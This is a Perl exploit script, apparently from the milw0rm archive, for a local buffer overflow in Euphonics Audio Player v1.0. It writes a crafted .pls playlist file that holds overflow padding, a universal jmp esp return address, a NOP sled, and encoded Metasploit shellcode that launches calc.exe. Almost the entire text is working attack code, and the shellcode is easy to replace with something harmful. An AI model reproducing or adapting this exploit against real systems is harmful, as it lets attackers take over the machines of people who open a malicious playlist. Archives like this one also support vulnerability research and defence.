#!/usr/bin/perl -w
#-----------------------------------------------------------------------------
# Author : Houssamix

# Euphonics Audio Player v1.0 (.pls) Universal Local Buffer Overflow Exploit
# Gr33tz to : str0ke , real-power.net , Legend-spy - stack 

# thx to h4ck3r#47 for the fisrt exploit http://milw0rm.com/exploits/7958
# just the ret adress is changed for make the exploit universal

#-----------------------------------------------------------------------------
my $overflow = "\x41" x 1324;
my $ret = "\xCB\xA3\x0F\x10"; # jmp esp from AdjMmsEng.dll <= universal adress
my $nop = "\x90" x 100 ;

# win32_exec -  EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com/
my $shellcode =
"\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x34".
"\x92\x42\x83\x83\xeb\xfc\xe2\xf4\xc8\x7a\x06\x83\x34\x92\xc9\xc6".
"\x08\x19\x3e\x86\x4c\x93\xad\x08\x7b\x8a\xc9\xdc\x14\x93\xa9\xca".
"\xbf\xa6\xc9\x82\xda\xa3\x82\x1a\x98\x16\x82\xf7\x33\x53\x88\x8e".
"\x35\x50\xa9\x77\x0f\xc6\x66\x87\x41\x77\xc9\xdc\x10\x93\xa9\xe5".
"\xbf\x9e\x09\x08\x6b\x8e\x43\x68\xbf\x8e\xc9\x82\xdf\x1b\x1e\xa7".
"\x30\x51\x73\x43\x50\x19\x02\xb3\xb1\x52\x3a\x8f\xbf\xd2\x4e\x08".
"\x44\x8e\xef\x08\x5c\x9a\xa9\x8a\xbf\x12\xf2\x83\x34\x92\xc9\xeb".
"\x08\xcd\x73\x75\x54\xc4\xcb\x7b\xb7\x52\x39\xd3\x5c\x62\xc8\x87".
"\x6b\xfa\xda\x7d\xbe\x9c\x15\x7c\xd3\xf1\x23\xef\x57\xbc\x27\xfb".
"\x51\x92\x42\x83";

my $file="hsmx.pls";

$exploit = $overflow.$ret.$nop.$shellcode;
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $exploit ;
close($FILE);
print "Done \n";

# milw0rm.com [2009-02-04]
